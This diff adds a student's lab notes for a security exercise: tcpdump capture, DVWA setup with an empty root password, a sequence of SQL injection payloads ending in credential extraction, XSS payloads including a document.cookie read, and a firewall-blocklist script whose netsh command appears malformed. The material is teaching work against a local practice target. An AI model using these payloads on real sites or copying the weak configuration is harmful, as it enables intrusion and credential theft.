@@ -1,0 +1,94 @@
+3) Packet Sniffing
+
+python3 -m http.server 8080
+sudo tcpdump -i any -w capture.pcap port 8080
+http.request.method=="GET"
+
+
+
+4) SQL Injection
+
+sudo apt update
+sudo apt install dvwa -y
+
+sudo systemctl start apache2
+sudo systemctl start mariadb
+
+sudo systemctl status apache2
+sudo systemctl status mariadb
+
+sudo ln -s /usr/share/dvwa /var/www/html/dvwa
+ls -l /var/www/html
+
+sudo chown -R www-data:www-data /usr/share/dvwa
+sudo chmod -R 755 /usr/share/dvwa
+
+sudo nano /usr/share/dvwa/config/config.inc.php
+$_DVWA['db_server'] = '127.0.0.1';
+$_DVWA['db_user'] = 'root';
+$_DVWA['db_password'] = '';
+$_DVWA['db_database'] = 'dvwa';
+
+sudo phpenmod mysqli
+sudo phpenmod gd
+
+sudo systemctl restart apache2
+
+sudo mysql
+ALTER USER 'root'@'localhost' IDENTIFIED BY '';
+FLUSH PRIVILEGES;
+EXIT;
+
+http://127.0.0.1/dvwa/setup.php
+Create / Reset Database
+http://127.0.0.1/dvwa/login.php
+Username: admin
+Password: password
+
+Security Level = Low
+DVWA → Vulnerabilities → SQL Injection
+
+1 — Normal Query -> 1
+2 — Authentication Bypass -> 1' OR '1'='1
+3 — Find Columns -> 1' ORDER BY 1-- -
+	1' ORDER BY 2-- -
+	1' ORDER BY 3-- -
+4 — UNION Injection -> 1' UNION SELECT 1,2-- -
+5 — Database Name -> 1' UNION SELECT database(),2-- -
+6 — Table Names -> 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+7 — Column Names -> 1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+8 — Extract Credentials -> 1' UNION SELECT user,password FROM users-- -
+
+5) XSS
+sudo service apache2 start 
+sudo service mysql start 
+http://localhost/dvwa
+DVWA Security → set level to Low → Submit
+XSS(Reflected) -> <script>alert('XSS')</script>
+XSS(Stored) -> <h1>Hacked</h1> , <script>alert('Stored XSS')</script>
+	<script>alert(document.cookie)</script> 
+XSS(DOM) -> #<script>alert('DOM XSS')</script>
+
+
+6) 
+a) Testing Authentication Weaknesses ->  Brute Force
+
+b) Testing Session Management
+inspect -> storage -> cookies
+
+1) Firewall
+
+import requests, csv, subprocess
+
+response = requests.get("https://feodotracker.abuse.ch/downloads/ipblocklist.csv").text
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+mycsv = csv.reader(filter(lambda x : not x.startswith('#'), response.splitlines()))
+
+for row in mycsv:
+    ip = row[1]
+    if ip != "dst_ip":
+        print("Added Rule to block: ",ip)
+        rule = "netsh advfirewall firewall add rulename='BadIP' Dir=Out Action=Block RemoteIP="+ip
+        subprocess.run(["PowerShell", "-Command", rule])
+
